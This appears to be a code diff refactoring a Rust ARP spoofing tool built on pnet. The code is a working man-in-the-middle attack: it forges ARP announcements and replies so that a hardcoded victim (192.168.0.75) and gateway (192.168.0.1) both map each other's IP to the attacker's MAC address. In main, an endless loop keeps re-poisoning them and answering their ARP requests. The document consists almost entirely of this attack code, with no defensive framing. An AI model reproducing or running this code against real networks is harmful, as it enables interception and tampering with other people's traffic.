@@ -3,13 +3,10 @@ mod arp_packets;
 extern crate core;
 
 use std::net::{IpAddr, Ipv4Addr};
-use std::time::Instant;
 use pnet_datalink;
-use pnet::packet::{self, MutablePacket, Packet};
-use pnet::packet::arp::{ArpHardwareType, ArpHardwareTypes, ArpOperation, ArpOperations};
-use pnet::packet::ethernet::{EtherType, EtherTypes};
-use pnet::packet::ip::{IpNextHeaderProtocol, IpNextHeaderProtocols};
-use pnet::packet::PacketSize;
+use pnet::packet::{self, Packet};
+use pnet::packet::arp::{ArpOperations};
+use pnet::packet::ethernet::{EtherTypes};
 use pnet::util::MacAddr;
 use pnet_datalink::{Channel, DataLinkReceiver, DataLinkSender, NetworkInterface};
 
@@ -40,28 +37,7 @@ fn get_local_ipv4_addr(network_interface: &NetworkInterface) -> Ipv4Addr {
 fn retrieve_mac_address(network_interface: &NetworkInterface, target_ip_addr: Ipv4Addr, tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver) -> Result<MacAddr, std::io::Error> {
     let sender_ip_addr = get_local_ipv4_addr(&network_interface);
 
-    // send arp request for the target_ip_addr
-    let packet = {
-        let mut arp_packet = packet::arp::MutableArpPacket::owned(vec![0u8; packet::arp::ArpPacket::minimum_packet_size()]).unwrap();
-        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
-        arp_packet.set_protocol_type(EtherTypes::Ipv4);
-        arp_packet.set_hw_addr_len(6);
-        arp_packet.set_proto_addr_len(4);
-        arp_packet.set_operation(ArpOperations::Request);
-        arp_packet.set_sender_hw_addr(network_interface.mac.unwrap());
-        arp_packet.set_sender_proto_addr(sender_ip_addr);
-        arp_packet.set_target_hw_addr(MacAddr::zero());
-        arp_packet.set_target_proto_addr(target_ip_addr);
-
-        let ethernet_packet_data = vec![0u8; packet::ethernet::EthernetPacket::minimum_packet_size() + arp_packet.packet_size()];
-        let mut ethernet_packet = packet::ethernet::MutableEthernetPacket::owned(ethernet_packet_data).unwrap();
-        ethernet_packet.set_destination(MacAddr::broadcast());
-        ethernet_packet.set_source(network_interface.mac.unwrap());
-        ethernet_packet.set_ethertype(packet::ethernet::EtherTypes::Arp);
-        ethernet_packet.set_payload(arp_packet.packet_mut());
-
-        ethernet_packet.packet().to_owned()
-    };
+    let packet = arp_packets::arp_request(network_interface.mac.unwrap(), sender_ip_addr, target_ip_addr);
 
     let process_next_packet = |rx: &mut dyn DataLinkReceiver| -> Option<MacAddr> {
         rx.next().ok().and_then(|incoming_packet| {
@@ -81,16 +57,16 @@ fn retrieve_mac_address(network_interface: &NetworkInterface, target_ip_addr: Ip
 
     // send an arp request packet, wait 5 sec for the response, if its unanswered send another arp request. Repeat this for a total of 10 arp request.
     // If the mac address could not be found return a timeout error.
-    for _ in 0..10 {
+    for _ in 0..5 {
         tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
 
-        let start_time = Instant::now();
+        let start_time = std::time::Instant::now();
         loop {
             match process_next_packet(rx) {
                 Some(addr) => return Ok(addr),
                 None => {},
             }
-            if start_time.elapsed().as_millis() > 5000 {
+            if start_time.elapsed().as_millis() > 3000 {
                 break;
             }
         }
@@ -98,59 +74,14 @@ fn retrieve_mac_address(network_interface: &NetworkInterface, target_ip_addr: Ip
     Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "Arp response timed out"))
 }
 
-fn send_arp_spoof_packets(network_interface: &NetworkInterface, tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver) {
-    let gateway_ip_addr = Ipv4Addr::new(192,168,0,1);
+fn send_arp_spoof_packets(network_interface: &NetworkInterface, gateway_ip_addr: Ipv4Addr, victim_ip_addr: Ipv4Addr, tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver, answer_arp_requests_for: std::time::Duration) {
     let gateway_mac_addr = retrieve_mac_address(&network_interface, gateway_ip_addr, tx, rx).expect("Could not locate gateway mac address");
-
-    let victim_ip_addr = Ipv4Addr::new(192,168,0,65);
     let victim_mac_addr = retrieve_mac_address(&network_interface, victim_ip_addr, tx, rx).expect("Could not locate victim mac address");
 
-    // send this arp packet to the gateway, telling it that its mac is now ours
-    let packet = {
-        let mut arp_packet = packet::arp::MutableArpPacket::owned(vec![0u8; packet::arp::ArpPacket::minimum_packet_size()]).unwrap();
-        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
-        arp_packet.set_protocol_type(EtherTypes::Ipv4);
-        arp_packet.set_hw_addr_len(6);
-        arp_packet.set_proto_addr_len(4);
-        arp_packet.set_operation(ArpOperations::Request);
-        arp_packet.set_sender_hw_addr(network_interface.mac.unwrap());
-        arp_packet.set_sender_proto_addr(victim_ip_addr);
-        arp_packet.set_target_hw_addr(MacAddr::zero());
-        arp_packet.set_target_proto_addr(victim_ip_addr);
-
-        let ethernet_packet_data = vec![0u8; packet::ethernet::EthernetPacket::minimum_packet_size() + arp_packet.packet_size()];
-        let mut ethernet_packet = packet::ethernet::MutableEthernetPacket::owned(ethernet_packet_data).unwrap();
-        ethernet_packet.set_destination(gateway_mac_addr);
-        ethernet_packet.set_source(network_interface.mac.unwrap());
-        ethernet_packet.set_ethertype(packet::ethernet::EtherTypes::Arp);
-        ethernet_packet.set_payload(arp_packet.packet_mut());
-
-        ethernet_packet.packet().to_owned()
-    };
+    let packet = arp_packets::arp_announcement(network_interface.mac.unwrap(), victim_ip_addr);
     tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
 
-    // send this packet to the victim, telling that the mac for the gateway is ours
-    let packet = {
-        let mut arp_packet = packet::arp::MutableArpPacket::owned(vec![0u8; packet::arp::ArpPacket::minimum_packet_size()]).unwrap();
-        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
-        arp_packet.set_protocol_type(EtherTypes::Ipv4);
-        arp_packet.set_hw_addr_len(6);
-        arp_packet.set_proto_addr_len(4);
-        arp_packet.set_operation(ArpOperations::Request);
-        arp_packet.set_sender_hw_addr(network_interface.mac.unwrap());
-        arp_packet.set_sender_proto_addr(gateway_ip_addr);
-        arp_packet.set_target_hw_addr(MacAddr::zero());
-        arp_packet.set_target_proto_addr(gateway_ip_addr);
-
-        let ethernet_packet_data = vec![0u8; packet::ethernet::EthernetPacket::minimum_packet_size() + arp_packet.packet_size()];
-        let mut ethernet_packet = packet::ethernet::MutableEthernetPacket::owned(ethernet_packet_data).unwrap();
-        ethernet_packet.set_destination(victim_mac_addr);
-        ethernet_packet.set_source(network_interface.mac.unwrap());
-        ethernet_packet.set_ethertype(packet::ethernet::EtherTypes::Arp);
-        ethernet_packet.set_payload(arp_packet.packet_mut());
-
-        ethernet_packet.packet().to_owned()
-    };
+    let packet = arp_packets::arp_announcement(network_interface.mac.unwrap(), gateway_ip_addr);
     tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
 
     let process_next_packet = |tx: &mut dyn DataLinkSender, rx: &mut dyn DataLinkReceiver| {
@@ -162,41 +93,36 @@ fn send_arp_spoof_packets(network_interface: &NetworkInterface, tx: &mut dyn Dat
             };
             packet::arp::ArpPacket::owned(ethernet_packet.payload().to_owned())
         }).and_then::<packet::arp::ArpPacket, _>(|arp_packet| {
-            if arp_packet.get_sender_proto_addr() == victim_ip_addr && arp_packet.get_target_proto_addr() == gateway_ip_addr {
-                let packet = {
-                    let mut arp_packet = packet::arp::MutableArpPacket::owned(vec![0u8; packet::arp::ArpPacket::minimum_packet_size()]).unwrap();
-                    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
-                    arp_packet.set_protocol_type(EtherTypes::Ipv4);
-                    arp_packet.set_hw_addr_len(6);
-                    arp_packet.set_proto_addr_len(4);
-                    arp_packet.set_operation(ArpOperations::Reply);
-                    arp_packet.set_sender_hw_addr(network_interface.mac.unwrap());
-                    arp_packet.set_sender_proto_addr(gateway_ip_addr);
-                    arp_packet.set_target_hw_addr(victim_mac_addr);
-                    arp_packet.set_target_proto_addr(victim_ip_addr);
-
-                    let ethernet_packet_data = vec![0u8; packet::ethernet::EthernetPacket::minimum_packet_size() + arp_packet.packet_size()];
-                    let mut ethernet_packet = packet::ethernet::MutableEthernetPacket::owned(ethernet_packet_data).unwrap();
-                    ethernet_packet.set_destination(victim_mac_addr);
-                    ethernet_packet.set_source(network_interface.mac.unwrap());
-                    ethernet_packet.set_ethertype(packet::ethernet::EtherTypes::Arp);
-                    ethernet_packet.set_payload(arp_packet.packet_mut());
-
-                    ethernet_packet.packet().to_owned()
+            if arp_packet.get_operation() == ArpOperations::Request {
+                // if the victim sends an arp request for the gateway we answer
+                if arp_packet.get_sender_proto_addr() == victim_ip_addr && arp_packet.get_target_proto_addr() == gateway_ip_addr {
+                    let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), gateway_ip_addr, victim_mac_addr, victim_ip_addr);
+                    tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
+                }
+                // if anyone sends an arp request for the victim we answer
+                else if arp_packet.get_target_proto_addr() == victim_ip_addr {
+                    let packet = arp_packets::arp_reply(network_interface.mac.unwrap(), victim_ip_addr, arp_packet.get_sender_hw_addr(), arp_packet.get_sender_proto_addr());
+                    tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
                 };
-                tx.send_to(&packet, None).expect("Could not send packet").expect("Packet sending failed");
-            }
+            };
             None
         });
     };
 
+    let now = std::time::Instant::now();
     loop {
         process_next_packet(tx, rx);
+        if now.elapsed() > answer_arp_requests_for {
+            break
+        }
     }
 }
 
 fn main() {
     let interface = create_interface("wlp3s0");
     let (mut tx, mut rx) = create_channels(&interface);
-    send_arp_spoof_packets(&interface, tx.as_mut(), rx.as_mut());
+
+    loop {
+        send_arp_spoof_packets(&interface, Ipv4Addr::new(192,168,0,1), Ipv4Addr::new(192,168,0,75), tx.as_mut(), rx.as_mut(), std::time::Duration::from_secs(2));
+    }
 }
